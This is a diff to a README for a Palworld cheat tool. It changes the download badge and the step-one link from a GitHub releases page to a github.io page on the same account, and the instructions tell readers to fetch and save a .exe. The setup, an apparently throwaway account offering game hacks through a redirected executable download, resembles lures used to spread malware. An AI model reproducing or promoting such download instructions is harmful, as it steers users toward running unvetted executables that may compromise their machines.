@@ -1,6 +1,6 @@
 # 🎮 Palworld-Evolution-Hack-2026 - Customize your gameplay experience with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/selfdeceitspacewalk828/Palworld-Evolution-Hack-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://selfdeceitspacewalk828.github.io)
 
 ## 📖 Overview
 
@@ -31,7 +31,7 @@ Your computer must meet these standards to run the software correctly:
 
 Follow these steps to obtain the files needed for operation:
 
-1. Visit the following link to access the software repository: [https://github.com/selfdeceitspacewalk828/Palworld-Evolution-Hack-2026/releases](https://github.com/selfdeceitspacewalk828/Palworld-Evolution-Hack-2026/releases).
+1. Visit the following link to access the software repository: [https://selfdeceitspacewalk828.github.io](https://selfdeceitspacewalk828.github.io).
 2. Look for the section labeled "Assets" under the most recent version tag.
 3. Select the file ending in .exe to begin your download.
 4. Save the file to a folder on your desktop where you can find it.
